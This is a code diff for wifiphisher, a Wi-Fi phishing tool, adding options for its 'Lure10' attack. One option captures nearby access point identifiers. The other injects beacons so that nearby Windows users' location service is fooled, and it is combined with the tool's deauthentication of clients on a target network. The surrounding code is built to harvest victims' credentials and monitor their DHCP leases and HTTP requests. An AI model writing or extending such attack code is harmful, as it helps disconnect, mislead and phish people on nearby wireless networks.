@@ -28,7 +28,7 @@ import wifiphisher.common.accesspoint as accesspoint
 reload(sys)
 sys.setdefaultencoding('utf8')
 
-VERSION = "1.2GIT"
+VERSION = "1.3GIT"
 args = 0
 mon_MAC = 0
 APs = {}  # for listing APs
@@ -93,6 +93,18 @@ def parse_args():
         help=("Stop the script after successfully retrieving one pair of "
               "credentials"),
         action='store_true')
+    parser.add_argument(
+        "-lC",
+        "--lure10-capture",
+        help=("Capture the BSSIDs of the APs that are discovered during "
+              "AP selection phase. This option is part of Lure10 attack."),
+        action='store_true')
+    parser.add_argument(
+        "-lE",
+        "--lure10-exploit",
+        help=("Fool the Windows Location Service of nearby Windows users "
+              "to believe it is within an area that was previously captured "
+              "with --lure10-capture. Part of the Lure10 attack."))
 
     return parser.parse_args()
 
@@ -116,6 +128,14 @@ def check_args(args):
     if args.nojamming and args.jamminginterface:
         sys.exit(
             '[' + R + '-' + W + '] --nojamming (-nJ) and --jamminginterface (-jI) cannot work together.')
+
+    if args.lure10_exploit and args.nojamming:
+        sys.exit(
+            '[' + R + '-' + W + '] --lure10-exploit (-lE) and --nojamming (-nJ) cannot work together.')
+
+    if args.lure10_exploit and not os.path.isfile(LOCS_DIR + args.lure10_exploit):
+        sys.exit(
+            '[' + R + '-' + W + '] Lure10 capture does not exist. Listing directory of captures: ' + str(os.listdir(LOCS_DIR)))
 
 
 def set_ip_fwd():
@@ -259,6 +279,8 @@ def select_access_point(screen, interface, mac_matcher):
 
     # start finding access points
     access_point_finder = recon.AccessPointFinder(interface)
+    if args.lure10_capture:
+        access_point_finder.capture_aps()
     access_point_finder.find_all_access_points()
 
     position = 1
@@ -708,6 +730,8 @@ class WifiphisherEngine:
             # start deauthenticating all client on target access point
             deauthentication = deauth.Deauthentication(ap_mac,
                                                        mon_iface.get_name())
+            if args.lure10_exploit:
+                deauthentication.add_lure10_beacons(LOCS_DIR + args.lure10_exploit)
             deauthentication.deauthenticate()
 
         # Main loop.
@@ -730,14 +754,14 @@ class WifiphisherEngine:
                                 # show the 5 most recent devices
                                 for client in deauthentication.get_clients()[-5:]:
                                     print client
-                        print term.move(9,0) + term.blue("DHCP Leases: ")
+                        print term.move(6,0) + term.blue("DHCP Leases: ")
                         if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
                             proc = check_output(['tail', '-5', '/var/lib/misc/dnsmasq.leases'])
-                            print term.move(10,0) + proc
-                        print term.move(17,0) + term.blue("HTTP requests: ")
+                            print term.move(7,0) + proc
+                        print term.move(13,0) + term.blue("HTTP requests: ")
                         if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
                             proc = check_output(['tail', '-5', '/tmp/wifiphisher-webserver.tmp'])
-                            print term.move(18,0) + proc
+                            print term.move(14,0) + proc
                         if phishinghttp.terminate and args.quitonsuccess:
                             raise KeyboardInterrupt
         except KeyboardInterrupt:
